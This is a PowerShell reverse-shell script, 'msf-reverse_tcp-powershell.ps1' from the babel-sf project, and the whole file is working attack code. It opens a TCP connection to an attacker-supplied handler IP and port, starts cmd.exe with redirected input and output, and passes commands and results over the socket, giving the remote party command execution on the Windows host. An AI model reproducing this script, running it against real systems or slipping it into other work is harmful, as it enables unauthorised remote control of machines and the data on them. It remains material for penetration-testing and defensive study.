#########################################################
# 
# msf-reverse_tcp-powershell.ps1 version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#
#########################################################
#
# Seems to be an variation on the following Original Code:
# PowerShell Bind by Josh Kelley (winfang) and Dave Kennedy (ReL1K)
# Defcon Release

param (
[Parameter()]
[string]$remote_handler,
[string]$port_number
)

if ($port_number -eq "")
{
echo "msf-reverse_tcp-powershell.ps1 - ( https://github.com/attackdebris/babel-sf )"
echo "`nUsage:"
echo ".\msf-reverse_tcp-powershell.ps1 [remote handler IP] [port]"
echo "e.g. .\msf-reverse_tcp-powershell.ps1 192.168.0.1 80`n"
exit
}

function ReverseShellClean 
{
if ($client.Connected -eq $true) {$client.Close()}  
if ($process.ExitCode -ne $null) {$process.Close()}  
exit  
}
$address = "$remote_handler"  
$port = "$port_number"
$client = New-Object system.net.sockets.tcpclient 
$client.connect($address,$port) 
echo "Starting msf-reverse_tcp.ps1 ( https://github.com/attackdebris/babel-sf )"
echo "Attemping to connect to $remote_handler on TCP port $port_number"
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize  
$process = New-Object System.Diagnostics.Process  
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'  
$process.StartInfo.RedirectStandardInput = 1  
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0  
$process.Start()  
$inputstream = $process.StandardInput  
$outputstream = $process.StandardOutput  

Start-Sleep 1  

$encoding = new-object System.Text.AsciiEncoding  

while($outputstream.Peek() -ne -1)
{
	$out += $encoding.GetString($outputstream.Read())
}
$stream.Write($encoding.GetBytes($out),0,$out.Length)  
$out = $null; $done = $false
$testing = 0
while (-not $done) 
{
	if ($client.Connected -ne $true) {cleanup}  
	$pos = 0
	$i = 1  
	while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) 
	{ 
		$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);  $pos+=$read 
		if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) 
		{
		break
		}
	}  
	if ($pos -gt 0)
	{ 
	$string = $encoding.GetString($networkbuffer,0,$pos)
	$inputstream.write($string)  
	start-sleep 1  
	if ($process.ExitCode -ne $null) {ReverseShellClean}
	else 
	{  
	$out = $encoding.GetString($outputstream.Read()) 
	while($outputstream.Peek() -ne -1)
	{
		$out += $encoding.GetString($outputstream.Read()) 
		if ($out -eq $string) {$out = ''}
	}  
	$stream.Write($encoding.GetBytes($out),0,$out.length)  
	$out = $null  
	$string = $null
	}
	} 
	else {ReverseShellClean}
}